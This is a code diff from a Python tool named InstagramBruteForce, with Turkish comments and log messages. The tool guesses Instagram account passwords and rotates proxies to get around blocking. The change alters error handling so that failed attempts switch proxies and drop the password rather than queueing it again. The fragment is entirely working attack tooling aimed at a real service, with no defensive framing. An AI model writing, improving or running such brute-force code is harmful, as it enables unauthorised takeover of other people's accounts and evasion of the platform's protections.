@@ -452,13 +452,11 @@ class InstagramBruteForce:
                             logger.warning(f"Bilinmeyen yanıt formatı: {json_data}")
                     except json.JSONDecodeError:
                         result = "ERROR"
-                        potential_passwords.add(password)
                         logger.error(f"JSON decode hatası: {response.text}")
                 
                 if result == "ERROR":
-                    # Hata alındı, proxy değiştir ve şifreyi tekrar kuyruğa ekle
-                    logger.info(f"Hata alındı, şifre tekrar denenecek: {password}")
-                    password_queue.append(password)
+                    # Hata alındı, proxy değiştir ve şifreyi atla (tekrar deneme)
+                    logger.info(f"Hata alındı, proxy değiştiriliyor: {password}")
                     self.current_proxy = self._get_working_proxy(progress_callback)
                     if self.current_proxy:
                         self.session.proxies = {'http': f'http://{self.current_proxy}', 'https': f'http://{self.current_proxy}'}
